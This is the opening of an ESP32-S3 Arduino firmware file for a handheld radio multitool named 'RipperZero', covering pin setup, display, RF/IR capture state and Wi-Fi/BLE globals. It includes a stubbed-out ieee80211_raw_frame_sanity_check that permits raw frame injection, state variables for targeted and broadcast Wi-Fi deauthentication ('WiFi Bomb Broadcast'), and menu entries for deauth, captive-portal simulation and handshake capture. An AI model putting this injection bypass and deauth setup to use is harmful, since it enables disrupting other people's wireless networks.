#include <lvgl.h>
#include "hex_background_320x480.h"
#include <Arduino_GFX_Library.h>
#include <SPI.h>
#include <ctype.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "esp_system.h"
#include "ping/ping_sock.h"
#include "esp32-hal-rmt.h"
#include <RadioLib.h>
#define E01_ACCESS_ENABLED 0
#if E01_ACCESS_ENABLED
#include <RF24.h>
#endif
#include <Preferences.h>
#include "FS.h"
#include "SD_MMC.h"
#include "TCA9554.h"
#include "TouchDrvFT6X36.hpp"
#include <SensorPCF85063.hpp>
#define XPOWERS_CHIP_AXP2101
#include <XPowersLib.h>
#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>
#include "ESP_I2S.h"
#include "es8311.h"

// The IR receiver signal is wired to the free J8-20 position, which maps to
// GPIO41 in the corrected header layout.
#define IR_RECEIVER_PIN 41
// J8-28 maps to free GPIO21 in the same verified header orientation.
// The KY-005 emitter's S pin is connected through an external 220 ohm resistor.
#define IR_TRANSMITTER_PIN 21
#include <IRremote.hpp>

// Temporary recovery probe.  This is compiled only while verifying that the
// LCD path works independently of LVGL and the radio subsystems.
#define RIPPER_DISPLAY_RECOVERY_TEST 0
#define RIPPER_SAFE_HOME_RECOVERY 0
#define RIPPER_RECOVERY_ENABLE_AUDIO 0
#define RIPPER_RECOVERY_ENABLE_CLOCK 1
#define RIPPER_RECOVERY_ENABLE_BATTERY 1
// Keep the known-good single-buffer display path while the full UI/services
// are restored. This avoids the earlier dual-buffer black-screen regression.
#define RIPPER_COMPACT_DRAW_BUFFER 1
// Waveshare's onboard TF slot uses SDMMC 1-bit mode on these ESP32-S3 pins.
// The card is mounted read/write only when present; this project never formats
// or deletes card contents during startup.
#define SD_MMC_CLK_PIN 11
#define SD_MMC_CMD_PIN 10
#define SD_MMC_D0_PIN  9

extern "C" int ieee80211_raw_frame_sanity_check(void *buffer, int len, int type) { return 0; }

// Forward declarations are needed because the Arduino sketch preprocessor
// generates callback prototypes before it reaches the RF layout/data structs.
struct SavedRfRawCommand;
struct RfLearnFrame;
struct SavedRemoteLayout;
struct SavedIrRemoteCommand;
struct IrRmtRun;

// Arduino-ESP32 3.2.0 can occasionally omit FunctionalInterrupt.cpp from a
// freshly rebuilt core archive.  This weak fallback only satisfies that core
// reference when it happens; normal function-pointer interrupts used here do
// not allocate a functional callback, and a core-provided implementation wins.
extern "C" void __attribute__((weak)) cleanupFunctional(void *arg) {
  (void)arg;
}

// ============================================================
// DISPLAY / TOUCH PINS
// ============================================================

#define GFX_BL 6

#define SPI_MISO 2
#define SPI_MOSI 1
#define SPI_SCLK 5

#define LCD_CS  -1
#define LCD_DC   3
#define LCD_RST -1

#define LCD_HOR_RES 320
#define LCD_VER_RES 480

#define I2C_SDA 8
#define I2C_SCL 7

#define AUDIO_MCLK_PIN 12
#define AUDIO_BCLK_PIN 13
#define AUDIO_LRCLK_PIN 15
#define AUDIO_DOUT_PIN 16
#define AUDIO_DIN_PIN 14
#define AUDIO_SAMPLE_RATE 44100

I2SClass board_audio_i2s;
es8311_handle_t board_audio_codec = NULL;
bool board_audio_ready = false;
bool sd_card_ready = false;
uint64_t sd_card_total_bytes = 0;
uint64_t sd_card_used_bytes = 0;

bool initialize_sd_card() {
  if (!SD_MMC.setPins(SD_MMC_CLK_PIN, SD_MMC_CMD_PIN, SD_MMC_D0_PIN)) {
    Serial.println("SD card pin assignment failed");
    return false;
  }
  if (!SD_MMC.begin("/sdcard", true, false, 20000)) {
    Serial.println("SD card not detected (insert a FAT32 card)");
    return false;
  }
  sd_card_total_bytes = SD_MMC.totalBytes();
  sd_card_used_bytes = SD_MMC.usedBytes();
  Serial.printf("SD card ready: %.1f MB total, %.1f MB used\n",
                (double)sd_card_total_bytes / 1048576.0,
                (double)sd_card_used_bytes / 1048576.0);
  return true;
}

// CC1101 uses its own SPI peripheral; the display SPI pins above remain untouched.
#define CC1101_GDO0 45
#define CC1101_CS   46
#define CC1101_SCK  40
#define CC1101_MOSI 42
#define CC1101_MISO 47
#define CC1101_GDO2 48

// The current display driver and CC1101 both require the ESP32-S3 SPI
// peripheral.  Keep CC1101 access off until it is moved to software SPI or a
// compatible shared-bus implementation; otherwise it steals the display bus.
#define CC1101_ACCESS_ENABLED 1

// E01-ML01DP5 / nRF24L01+ foundation. The E01 can share the CC1101 SPI
// clock/data wires, but it needs its own CE and CSN GPIOs. Keep this disabled
// until those two J8 connections and the module's regulated 3.3 V supply are
// physically confirmed. Never power this module from 5 V.
#define E01_CE_PIN         -1
#define E01_CSN_PIN        -1


// ============================================================
// COLORS
// ============================================================

#define COLOR_BG        0x030609
#define COLOR_PANEL     0x0E1722
#define COLOR_PANEL2    0x172535
#define COLOR_BORDER    0xFFFFFF
#define COLOR_SHADOW    0x000000
#define COLOR_TEXT      0xFFFFFF
#define COLOR_MUTED     0xFFFFFF

#define COLOR_RF        0xA855F7
#define COLOR_IR        0xFF3B30
#define COLOR_SAVED     0xFFD60A
#define COLOR_BLUETOOTH 0x00BFFF
#define COLOR_QR        0xA855F7
#define COLOR_SETTINGS  0xFF9500
#define COLOR_READY     0x55E85A

#define COLOR_GREEN     0x55E85A
#define COLOR_RED       0xFF3B30


// ============================================================
// HARDWARE OBJECTS
// ============================================================

TCA9554 TCA(0x20);
XPowersPMU battery_pmu;

Arduino_DataBus *bus = new Arduino_ESP32SPI(
  LCD_DC,
  LCD_CS,
  SPI_SCLK,
  SPI_MOSI,
  SPI_MISO
);

Arduino_GFX *gfx = new Arduino_ST7796(
  bus,
  LCD_RST,
  0,
  true,
  LCD_HOR_RES,
  LCD_VER_RES
);

TouchDrvFT6X36 touch;
SensorPCF85063 rtc;

#if CC1101_ACCESS_ENABLED
SPIClass cc1101_spi(HSPI);
Module cc1101_module(
  CC1101_CS,
  CC1101_GDO0,
  RADIOLIB_NC,
  CC1101_GDO2,
  cc1101_spi
);
CC1101 cc1101(&cc1101_module);
#endif
bool cc1101_ready = false;

#if E01_ACCESS_ENABLED
#if E01_CE_PIN < 0 || E01_CSN_PIN < 0
#error "Set verified E01 CE and CSN GPIO pins before enabling E01 access"
#endif
RF24 e01_radio;
#endif
bool e01_ready = false;
bool rf_rmt_ready = false;
bool rf_rmt_capture_started = false;
rmt_data_t rf_rmt_symbols[1024];
size_t rf_rmt_symbol_count = 1024;

// Receive-only raw OOK capture used to validate an owned remote before any
// learned signal is offered for replay or storage.
// Retain a complete short remote burst. This is the foundation for matching
// repeated samples and extracting a stable frame before any replay is enabled.
#define RF_CAPTURE_MAX_EDGES 2048
#define RF_CAPTURE_MIN_PULSE_US 120
#define RF_CAPTURE_MIN_SIGNAL_DBM -50.0f
// Take a short idle-RF baseline before recording. A real button press must
// rise above this baseline so constant nearby RF is not mistaken for a remote.
#define RF_CAPTURE_BASELINE_MS 250
#define RF_CAPTURE_MIN_RSSI_RISE_DB 8.0f
#define RF_CAPTURE_MIN_VALID_RSSI_DBM -85.0f
// Some compatible outlet remotes use a long sync interval within a command.
// Keep it as part of the frame; an actual inter-command pause is much longer.
// Preserve long protocol intervals; frame extraction is performed only after
// repeat analysis, not by assuming a particular raw-pulse gap.
#define RF_CAPTURE_FRAME_GAP_US 25000
// Arduino's RMT receiver finishes a capture by reporting an approximately
// 25 ms idle duration.  That is a recorder marker, not part of a remote
// command.  Keep this threshold comfortably below the configured RMT timeout
// but above the long sync spaces used by the remotes we support.
#define RF_RMT_IDLE_MARKER_US 23000
#define RF_FRAME_DELIMITER_US RF_RMT_IDLE_MARKER_US
volatile bool rf_capture_active = false;
volatile uint16_t rf_capture_edge_count = 0;
volatile uint32_t rf_capture_last_edge_us = 0;
volatile uint32_t rf_capture_durations[RF_CAPTURE_MAX_EDGES];
volatile uint8_t rf_capture_levels[RF_CAPTURE_MAX_EDGES];
volatile bool rf_capture_carrier_seen = false;
volatile bool rf_capture_gdo2_seen = false;
bool rf_capture_ready = false;
float rf_capture_peak_rssi = -140.0f;
float rf_capture_baseline_rssi = -140.0f;
float rf_capture_baseline_sum = 0.0f;
uint16_t rf_capture_baseline_samples = 0;
uint32_t rf_capture_armed_ms = 0;
bool rf_capture_baseline_ready = false;
uint8_t rf_capture_repeat_quality = 0;
uint8_t rf_capture_repeat_count = 0;

#define RF_LEARN_SAMPLE_COUNT 3
uint8_t rf_learn_sample_count = 0;
uint32_t rf_learn_hashes[RF_LEARN_SAMPLE_COUNT];
uint16_t rf_learn_edge_counts[RF_LEARN_SAMPLE_COUNT];
uint32_t rf_learn_samples[RF_LEARN_SAMPLE_COUNT][RF_CAPTURE_MAX_EDGES];


// ============================================================
// LVGL VARIABLES
// ============================================================

uint32_t screenWidth;
uint32_t screenHeight;
uint32_t bufSize;

lv_disp_draw_buf_t draw_buf;

lv_color_t *disp_draw_buf1;
lv_color_t *disp_draw_buf2;

lv_disp_drv_t disp_drv;


// ============================================================
// SCREEN VARIABLES
// ============================================================

lv_obj_t *home_screen;

lv_obj_t *rf_screen;
lv_obj_t *rf_universal_screen;
lv_obj_t *rf_known_screen;
lv_obj_t *rf_discovery_screen;
lv_obj_t *dip_fan_discovery_screen = NULL;
lv_obj_t *dip_fan_state_label = NULL;
lv_obj_t *dip_fan_hint_label = NULL;
lv_obj_t *dip_fan_config_screen = NULL;
lv_obj_t *dip_fan_config_label = NULL;
lv_obj_t *dip_fan_bit_buttons[5] = {};
lv_obj_t *rf_profile_screen = NULL;
lv_obj_t *rf_profile_active_label = NULL;
lv_obj_t *rf_scope_screen = NULL;
lv_obj_t *rf_scanner_screen = NULL;
lv_obj_t *rf_scanner_stage_label = NULL;
lv_obj_t *rf_scanner_result_label = NULL;
lv_obj_t *rf_scanner_progress_bar = NULL;
lv_obj_t *rf_scanner_start_button = NULL;
lv_obj_t *rf_scanner_save_button = NULL;
lv_obj_t *rf_scanner_details_button = NULL;
#define RF_LIVE_SCAN_COLUMNS 32
#define RF_LIVE_WATERFALL_ROWS 10
lv_obj_t *rf_live_spectrum_bars[RF_LIVE_SCAN_COLUMNS] = {};
lv_obj_t *rf_live_peak_markers[RF_LIVE_SCAN_COLUMNS] = {};
lv_obj_t *rf_live_waterfall[RF_LIVE_WATERFALL_ROWS][RF_LIVE_SCAN_COLUMNS] = {};
lv_obj_t *rf_live_band_button = NULL;
lv_obj_t *rf_live_hold_button = NULL;
lv_obj_t *rf_live_analyze_button = NULL;
lv_obj_t *rf_live_status_label = NULL;
lv_obj_t *rf_live_peak_label = NULL;
lv_obj_t *rf_live_frequency_label = NULL;
lv_obj_t *rf_live_spectrum_panel = NULL;
enum RfLiveBand : uint8_t { RF_LIVE_BAND_ALL, RF_LIVE_BAND_315, RF_LIVE_BAND_390, RF_LIVE_BAND_433 };
RfLiveBand rf_live_band = RF_LIVE_BAND_ALL;
bool rf_live_scanning = false;
bool rf_live_hold = false;
bool rf_live_tune_pending = false;
uint8_t rf_live_point_index = 0;
uint8_t rf_live_point_count = 0;
uint8_t rf_live_all_stage = 0;
uint8_t rf_live_profile_index = 6;
float rf_live_start_mhz = 304.0f;
float rf_live_stop_mhz = 326.0f;
float rf_live_current_frequency = 304.0f;
float rf_live_selected_frequency = 0.0f;
uint8_t rf_live_selected_profile = 6;
float rf_live_selected_rssi = -140.0f;
uint8_t rf_live_previous_profile = 0;
bool rf_live_previous_profile_valid = false;
uint32_t rf_live_next_action_ms = 0;
uint8_t rf_live_levels[RF_LIVE_SCAN_COLUMNS] = {};
uint8_t rf_live_peak_levels[RF_LIVE_SCAN_COLUMNS] = {};
uint8_t rf_live_pending_all_levels[RF_LIVE_SCAN_COLUMNS] = {};
uint8_t rf_live_waterfall_levels[RF_LIVE_WATERFALL_ROWS][RF_LIVE_SCAN_COLUMNS] = {};
float rf_analyzer_preferred_frequency = 0.0f;
uint8_t rf_analyzer_preferred_profile = 0;
lv_obj_t *rf_scope_profile_label = NULL;
lv_obj_t *rf_scope_rssi_label = NULL;
lv_obj_t *rf_scope_caption_label = NULL;
lv_obj_t *rf_scope_state_label = NULL;
lv_obj_t *rf_scope_axis_label = NULL;
lv_obj_t *rf_scope_waveform_message = NULL;
lv_obj_t *rf_scope_panel = NULL;
lv_obj_t *rf_scope_waterfall_panel = NULL;
lv_obj_t *rf_scope_details_panel = NULL;
lv_obj_t *rf_scope_details_label = NULL;
lv_obj_t *rf_scope_peak_marker = NULL;
lv_obj_t *rf_scope_tab_buttons[3] = {};
lv_obj_t *rf_scope_scan_button = NULL;
lv_obj_t *rf_scope_lock_button = NULL;
lv_obj_t *rf_scope_capture_button = NULL;
lv_obj_t *rf_scope_save_button = NULL;
#define RF_SCOPE_BAR_COUNT 32
#define RF_SCOPE_WATERFALL_ROWS 6
lv_obj_t *rf_scope_bars[RF_SCOPE_BAR_COUNT] = {};
lv_obj_t *rf_scope_waterfall_cells[RF_SCOPE_WATERFALL_ROWS][RF_SCOPE_BAR_COUNT] = {};
uint8_t rf_scope_levels[RF_SCOPE_BAR_COUNT] = {};
uint8_t rf_scope_waterfall_levels[RF_SCOPE_WATERFALL_ROWS][RF_SCOPE_BAR_COUNT] = {};
bool rf_scope_active = false;
bool rf_scope_capture_mode = false;
enum RfScopeMode : uint8_t {
  RF_SCOPE_MODE_LIVE,
  RF_SCOPE_MODE_PULSE,
  RF_SCOPE_MODE_SWEEP
};
RfScopeMode rf_scope_mode = RF_SCOPE_MODE_LIVE;
uint32_t rf_scope_last_sample_ms = 0;
uint32_t rf_scope_last_label_ms = 0;
uint32_t rf_scope_capture_started_ms = 0;
float rf_scope_peak_rssi = -140.0f;
float rf_scope_capture_frequency = 433.92f;
float rf_scope_sweep_start_mhz = 0.0f;
float rf_scope_sweep_stop_mhz = 0.0f;
float rf_scope_sweep_best_mhz = 0.0f;
float rf_scope_sweep_best_rssi = -140.0f;
uint8_t rf_scope_sweep_profile_index = 0;
uint8_t rf_scope_sweep_index = 0;
uint32_t rf_scope_sweep_next_ms = 0;
bool rf_scope_auto_analyze = false;
bool rf_scope_fine_refining = false;
bool rf_scanner_normal_flow = false;
bool rf_scope_waterfall_live = false;
uint8_t rf_scope_waterfall_band = 0;
uint8_t rf_scope_auto_band = 0;
float rf_scope_auto_best_mhz = 0.0f;
float rf_scope_auto_best_rssi = -140.0f;
uint8_t rf_scope_auto_best_profile = 2;
uint8_t rf_scope_sweep_column_offset = 0;
uint8_t rf_scope_sweep_column_count = RF_SCOPE_BAR_COUNT;
bool rf_scope_frequency_locked = false;
bool rf_scope_report_ready = false;
uint16_t rf_scope_report_edges = 0;
uint32_t rf_scope_report_shortest = 0;
uint32_t rf_scope_report_longest = 0;
uint32_t rf_scope_report_bit_us = 0;
bool rf_scope_report_repeats = false;
char rf_scope_report_profile[20] = "UNKNOWN";
uint8_t rf_scope_tab = 0;  // 0 = spectrum, 1 = waveform, 2 = details

struct RfAnalysisReport {
  uint32_t magic;
  float frequency_mhz;
  float peak_rssi;
  uint16_t edges;
  uint32_t shortest_us;
  uint32_t longest_us;
  uint32_t bit_us;
  uint8_t repeats;
  char likely_profile[20];
  char date_time[24];
};

#define ROLLING_ANALYSIS_MAGIC 0x524F4C31UL
#define MAX_ROLLING_ANALYSIS_RECORDS 8
struct RollingCodeAnalysisRecord {
  uint32_t magic;
  uint32_t sequence;
  float frequency_mhz;
  uint8_t profile_index;
  uint8_t structural_similarity;
  uint16_t edge_count;
  uint32_t fingerprints[RF_LEARN_SAMPLE_COUNT];
  uint32_t total_us[RF_LEARN_SAMPLE_COUNT];
  uint16_t shortest_us[RF_LEARN_SAMPLE_COUNT];
  uint16_t longest_us[RF_LEARN_SAMPLE_COUNT];
  uint8_t protocol_confidence;
  char likely_protocol[28];
  char category[20];
  char date_time[24];
};

lv_obj_t *device_type_screen;
lv_obj_t *known_capture_screen;

lv_obj_t *universal_remote_screen;
lv_obj_t *universal_capture_screen;
lv_obj_t *remote_layout_screen = NULL;
lv_obj_t *remote_layout_hint_label = NULL;

lv_obj_t *ir_screen;
lv_obj_t *ir_blast_screen = NULL;
lv_obj_t *ir_blast_label = NULL;
lv_obj_t *ir_blast_effect = NULL;
lv_obj_t *ir_blast_transmit_screen = NULL;
lv_obj_t *ir_blast_transmit_title = NULL;
lv_obj_t *ir_blast_transmit_detail = NULL;
lv_obj_t *ir_blast_transmit_phase = NULL;
lv_obj_t *ir_blast_transmit_rings[3] = {};
lv_obj_t *ir_copy_category_screen = NULL;
lv_obj_t *ir_guided_copy_screen = NULL;
lv_obj_t *ir_guided_instruction_label = NULL;
lv_obj_t *ir_guided_progress_label = NULL;
lv_obj_t *ir_guided_learn_button = NULL;
lv_obj_t *ir_guided_skip_button = NULL;
lv_obj_t *ir_guided_finish_button = NULL;
lv_obj_t *ir_discovery_category_screen = NULL;
lv_obj_t *ir_discovery_screen = NULL;
lv_obj_t *ir_discovery_label = NULL;
lv_obj_t *ir_discovery_send_button = NULL;
lv_obj_t *ir_discovery_worked_button = NULL;
lv_obj_t *ir_discovery_next_button = NULL;
lv_obj_t *ir_saved_screen = NULL;
lv_obj_t *ir_saved_summary_label = NULL;
lv_obj_t *ir_remote_builder_screen = NULL;
lv_obj_t *ir_remote_name_screen = NULL;
lv_obj_t *ir_remote_name_textarea = NULL;
lv_obj_t *ir_learn_screen = NULL;
lv_obj_t *ir_learn_state_label = NULL;
lv_obj_t *ir_custom_button_name_screen = NULL;
lv_obj_t *ir_custom_button_name_textarea = NULL;
lv_obj_t *saved_screen;
lv_obj_t *saved_summary_label = NULL;
lv_obj_t *saved_hub_screen = NULL;
lv_obj_t *saved_hub_label = NULL;
#define MAX_SAVED_HUB_TILES 12
lv_obj_t *saved_hub_tiles[MAX_SAVED_HUB_TILES] = {};
lv_obj_t *saved_hub_tile_name_labels[MAX_SAVED_HUB_TILES] = {};
lv_obj_t *saved_hub_tile_type_labels[MAX_SAVED_HUB_TILES] = {};
lv_obj_t *saved_hub_rf_icons[MAX_SAVED_HUB_TILES] = {};
lv_obj_t *saved_hub_ir_icons[MAX_SAVED_HUB_TILES] = {};
lv_obj_t *saved_hub_empty_label = NULL;
lv_obj_t *saved_delete_confirm_screen = NULL;
lv_obj_t *saved_delete_confirm_label = NULL;
lv_obj_t *saved_rename_screen = NULL;
lv_obj_t *saved_rename_textarea = NULL;
bool saved_delete_pending_is_ir = false;
uint8_t saved_delete_pending_index = 0;
bool saved_hub_ignore_release_click = false;
lv_obj_t *universal_name_screen;
lv_obj_t *universal_name_textarea = NULL;
lv_obj_t *rf_button_name_screen = NULL;
lv_obj_t *rf_button_name_textarea = NULL;
lv_obj_t *rf_capture_state_label = NULL;
lv_obj_t *rf_capture_replay_button = NULL;
lv_obj_t *settings_screen;
lv_obj_t *hardware_status_label = NULL;
#define HARDWARE_STATUS_DOT_COUNT 3
lv_obj_t *hardware_status_dots[HARDWARE_STATUS_DOT_COUNT] = {};
lv_obj_t *brightness_screen = NULL;
lv_obj_t *brightness_value_label = NULL;
lv_obj_t *clock_settings_screen = NULL;
lv_obj_t *clock_edit_value_label = NULL;
lv_obj_t *clock_edit_field_label = NULL;
lv_obj_t *home_clock_label = NULL;
#define MAX_HEADER_CLOCKS 48
lv_obj_t *header_clock_labels[MAX_HEADER_CLOCKS] = {};
uint8_t header_clock_count = 0;
lv_obj_t *wifi_screen = NULL;
lv_obj_t *wifi_networks_screen = NULL;
lv_obj_t *wifi_detail_screen = NULL;
lv_obj_t *wifi_connect_screen = NULL;
lv_obj_t *wifi_connect_network_label = NULL;
lv_obj_t *wifi_connect_password_textarea = NULL;
lv_obj_t *wifi_connect_status_label = NULL;
lv_obj_t *wifi_connect_keyboard = NULL;
lv_obj_t *wifi_channels_screen = NULL;
lv_obj_t *wifi_tool_screen = NULL;
lv_obj_t *wifi_custom_ssids_screen = NULL;
lv_obj_t *wifi_custom_ssid_editor_screen = NULL;
lv_obj_t *wifi_credentials_screen = NULL;
lv_obj_t *wifi_credentials_status_label = NULL;
lv_obj_t *wifi_custom_ssid_list = NULL;
lv_obj_t *wifi_custom_ssid_status_label = NULL;
lv_obj_t *wifi_custom_ssid_count_label = NULL;
lv_obj_t *wifi_custom_ssid_channel_label = NULL;
lv_obj_t *wifi_custom_ssid_textarea = NULL;
lv_obj_t *wifi_custom_ssid_keyboard = NULL;
esp_ping_handle_t wifi_ping_handle = NULL;
volatile uint32_t wifi_ping_sent = 0;
volatile uint32_t wifi_ping_received = 0;
volatile uint32_t wifi_ping_total_ms = 0;
volatile uint32_t wifi_ping_min_ms = UINT32_MAX;
volatile uint32_t wifi_ping_max_ms = 0;
volatile bool wifi_ping_finished = false;
lv_obj_t *ble_screen = NULL;
lv_obj_t *wifi_info_label = NULL;
lv_obj_t *wifi_results_heading = NULL;
lv_obj_t *wifi_network_list = NULL;
lv_obj_t *wifi_detail_name_label = NULL;
lv_obj_t *wifi_detail_info_label = NULL;
lv_obj_t *wifi_detail_meter_fill = NULL;
#define WIFI_RSSI_HISTORY_POINTS 28
lv_obj_t *wifi_rssi_history_bars[WIFI_RSSI_HISTORY_POINTS] = {};
int8_t wifi_rssi_history[WIFI_RSSI_HISTORY_POINTS] = {};
uint8_t wifi_rssi_history_count = 0;
lv_obj_t *wifi_channel_bars[13] = {};
lv_obj_t *wifi_channel_count_labels[13] = {};
lv_obj_t *ble_info_label = NULL;
bool wifi_scan_active = false;
enum WifiScanPurpose : uint8_t { WIFI_SCAN_NETWORKS = 0, WIFI_SCAN_LIVE_SIGNAL = 1 };
WifiScanPurpose wifi_scan_purpose = WIFI_SCAN_NETWORKS;
uint32_t wifi_live_scan_due_ms = 0;
#define MAX_WIFI_RESULTS 24
struct WifiNetworkResult {
  char ssid[33];
  char bssid[18];
  int32_t rssi;
  uint8_t channel;
  wifi_auth_mode_t auth;
};
WifiNetworkResult wifi_results[MAX_WIFI_RESULTS] = {};
uint8_t wifi_result_count = 0;
int8_t wifi_selected_network = -1;
bool wifi_connect_pending = false;
uint32_t wifi_connect_started_ms = 0;
char wifi_connect_pending_ssid[33] = {};
char wifi_connect_pending_password[64] = {};
char wifi_selected_bssid[18] = {};
lv_obj_t *wifi_tool_title_label = NULL;
lv_obj_t *wifi_tool_status_label = NULL;
lv_obj_t *wifi_tool_action_button = NULL;
uint8_t wifi_active_tool = 0;
uint8_t wifi_active_menu_index = 0;
bool wifi_monitor_running = false;
bool wifi_channel_hopping = false;
bool wifi_pcap_recording = false;
// ============================================================
// SECTION 1: GLOBAL DEAUTH VARIABLES & STATE TRACKING
// ============================================================
static bool vibe_deauth_active = false;
static bool vibe_is_targeted_mode = false; // true = Targeted, false = WiFi Bomb Broadcast
static uint32_t vibe_pkts_sent = 0;
static unsigned long vibe_last_tx_time = 0;

// Shared labels to show real-time stats
static lv_obj_t *vibe_deauth_screen = NULL;
static lv_obj_t *vibe_status_label = NULL;
static lv_obj_t *vibe_count_label = NULL;
static lv_obj_t *vibe_target_label = NULL;
static lv_obj_t *vibe_action_btn = NULL;
static lv_obj_t *vibe_btn_label = NULL;
static lv_timer_t *vibe_engine_timer = NULL;

// Active memory variables populated by your network scanner
static uint8_t dynamic_target_ap[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint8_t dynamic_target_client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Default to Broadcast (all devices)
static uint8_t dynamic_target_chan = 1;
static String dynamic_target_ssid = "Broadcast Target";

uint8_t wifi_monitor_channel = 1;
uint32_t wifi_next_channel_ms = 0;
volatile uint32_t wifi_packet_count = 0;
volatile uint32_t wifi_auth_count = 0;
volatile uint32_t wifi_assoc_count = 0;
volatile uint32_t wifi_deauth_count = 0;
volatile uint32_t wifi_eapol_count = 0;
volatile int8_t wifi_last_packet_rssi = -100;
volatile uint32_t wifi_channel_packet_counts[13] = {};
uint32_t wifi_last_tool_refresh_ms = 0;
File wifi_pcap_file;
WebServer wifi_web_server(80);
DNSServer wifi_dns_server;
bool wifi_ap_service_running = false;
bool wifi_web_service_running = false;
bool wifi_setup_portal_active = false;
bool wifi_saved_connection_attempted = false;
char wifi_control_ap_password[13] = {};
#define WIFI_CUSTOM_SSID_MAX 10
#define WIFI_CUSTOM_SSID_ROTATE_MS 5000UL
char wifi_custom_ssids[WIFI_CUSTOM_SSID_MAX][33] = {};
bool wifi_custom_ssid_selected[WIFI_CUSTOM_SSID_MAX] = {};
uint8_t wifi_custom_ssid_count = 0;
int8_t wifi_custom_ssid_edit_index = -1;
uint8_t wifi_custom_ssid_channel = 1;
uint8_t wifi_custom_ssid_active_index = 0;
uint32_t wifi_custom_ssid_next_rotate_ms = 0;
bool wifi_custom_ssid_running = false;
enum WifiOperatingState : uint8_t {
  WIFI_OP_IDLE = 0,
  WIFI_OP_STA_CONNECTING,
  WIFI_OP_STA_CONNECTED,
  WIFI_OP_SCANNING,
  WIFI_OP_MONITOR,
  WIFI_OP_AP_WEB,
  WIFI_OP_AP_STA_WEB,
  WIFI_OP_LAN_DIAGNOSTIC,
  WIFI_OP_CUSTOM_SSIDS
};
WifiOperatingState wifi_operating_state = WIFI_OP_IDLE;
bool wifi_enter_operating_state(WifiOperatingState target);
bool begin_wifi_lan_diagnostic();
const char *wifi_operating_state_name(uint8_t state) {
  switch (state) {
    case WIFI_OP_STA_CONNECTING: return "STA CONNECTING";
    case WIFI_OP_STA_CONNECTED: return "STA CONNECTED";
    case WIFI_OP_SCANNING: return "SCANNING";
    case WIFI_OP_MONITOR: return "MONITOR";
    case WIFI_OP_AP_WEB: return "AP WEB";
    case WIFI_OP_AP_STA_WEB: return "AP+STA WEB";
    case WIFI_OP_LAN_DIAGNOSTIC: return "LAN DIAGNOSTIC";
    case WIFI_OP_CUSTOM_SSIDS: return "CUSTOM SSIDS";
    default: return "IDLE";
  }
}
#define WIFI_CAPTURE_QUEUE_SIZE 6
struct WifiCaptureSlot {
  uint64_t timestamp_us;
  uint16_t length;
  int8_t rssi;
  uint8_t data[256];
};
WifiCaptureSlot wifi_capture_queue[WIFI_CAPTURE_QUEUE_SIZE];
portMUX_TYPE wifi_capture_lock = portMUX_INITIALIZER_UNLOCKED;
volatile uint8_t wifi_capture_write = 0;
volatile uint8_t wifi_capture_read = 0;
volatile uint32_t wifi_capture_dropped_packets = 0;
uint64_t wifi_capture_epoch_us = 0;
uint64_t wifi_capture_monotonic_us = 0;
uint32_t wifi_capture_last_micros32 = 0;
#define WIFI_OBSERVED_CLIENTS 12
struct WifiObservedClient {
  uint8_t mac[6];
  int8_t rssi;
  uint8_t channel;
  uint32_t last_seen_ms;
  uint32_t packets;
};
WifiObservedClient wifi_observed_clients[WIFI_OBSERVED_CLIENTS] = {};
portMUX_TYPE wifi_clients_lock = portMUX_INITIALIZER_UNLOCKED;
volatile uint8_t wifi_observed_client_count = 0;
#define WIFI_EVENT_HISTORY_SIZE 32
struct WifiEventRecord {
  uint32_t time_ms;
  uint8_t kind;
  int8_t rssi;
  uint8_t channel;
  uint8_t mac[6];
};
WifiEventRecord wifi_event_history[WIFI_EVENT_HISTORY_SIZE] = {};
portMUX_TYPE wifi_events_lock = portMUX_INITIALIZER_UNLOCKED;
volatile uint8_t wifi_event_write = 0;
volatile uint32_t wifi_event_total = 0;
bool wifi_host_discovery_running = false;
uint16_t wifi_host_discovery_address = 1;
uint8_t wifi_host_discovery_found = 0;
char wifi_host_discovery_report[420] = {};
bool wifi_gps_fix_valid = false;
double wifi_gps_latitude = 0.0;
double wifi_gps_longitude = 0.0;
uint32_t wifi_gps_fix_time_ms = 0;
const char *const WIFI_COMPARISON_MENU_NAMES[] = {
  "Wi-Fi network scanning", "Signal strength monitoring", "Wi-Fi channel analysis",
  "Connected client observation", "Packet sniffing", "Channel hopping",
  "WPA handshake observation", "Live Broadcast Deauth", "Ripper access point",
  "Portal simulation", "Wardriving", "Network host discovery", "Port scanning",
  "Wi-Fi Events", "Saved Captures/History", "Ping/Latency/Loss",
  "Ripper Web Control", "Wi-Fi setup portal", "Custom SSIDs"
};
const uint8_t WIFI_COMPARISON_TOOL_IDS[] = {
  0, 1, 2, 5, 5, 4, 11, 8, 13, 17, 22, 18, 19, 9, 24, 20, 15, 16, 25
};
#define WIFI_COMPARISON_MENU_COUNT (sizeof(WIFI_COMPARISON_MENU_NAMES) / sizeof(WIFI_COMPARISON_MENU_NAMES[0]))
// Kept in static storage so the full, scrollable result list does not need
// transient heap allocations while the Wi-Fi driver is releasing its buffers.
char wifi_scan_report[1800] = {};
lv_obj_t *bluetooth_screen;
lv_obj_t *bluetooth_state_label = NULL;
#define BLUETOOTH_REMOTE_CONTROL_COUNT 7
lv_obj_t *bluetooth_remote_controls[BLUETOOTH_REMOTE_CONTROL_COUNT] = {};
bool bluetooth_opened_from_ble = false;
lv_obj_t *bluetooth_bonds_screen = NULL;
lv_obj_t *bluetooth_bonds_label = NULL;
#define MAX_BLUETOOTH_BOND_ROWS 3
lv_obj_t *bluetooth_bond_rows[MAX_BLUETOOTH_BOND_ROWS] = {};
lv_obj_t *bluetooth_bond_number_labels[MAX_BLUETOOTH_BOND_ROWS] = {};
lv_obj_t *bluetooth_bond_address_labels[MAX_BLUETOOTH_BOND_ROWS] = {};
lv_obj_t *bluetooth_forget_selected_button = NULL;
lv_obj_t *bluetooth_forget_confirm_screen = NULL;
lv_obj_t *bluetooth_forget_confirm_label = NULL;
int8_t bluetooth_selected_bond = -1;
NimBLEAddress bluetooth_forget_address;
lv_obj_t *qr_generator_screen = NULL;
lv_obj_t *qr_display_screen = NULL;
lv_obj_t *qr_textarea = NULL;
lv_obj_t *qr_code = NULL;
lv_obj_t *qr_preview_label = NULL;
char qr_last_text[97] = "RipperZero";

bool rtc_ready = false;
bool clock_24_hour = false;
uint32_t clock_last_refresh_ms = 0;
uint8_t display_brightness = 100;
uint16_t clock_edit_year = 2026;
